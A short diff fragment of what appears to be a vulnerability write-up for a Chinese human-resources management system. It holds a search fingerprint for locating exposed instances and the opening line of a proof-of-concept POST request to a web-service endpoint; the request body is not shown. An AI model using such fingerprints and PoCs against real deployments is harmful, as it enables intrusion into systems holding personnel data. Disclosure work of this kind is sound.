@@ -8,7 +8,7 @@
 body="人力资源管理系统" && body="Silverlight"
 ```
 
-## poc
+## POC
 
 ```
 POST /ws/GetFunc_code.asmx HTTP/1.1
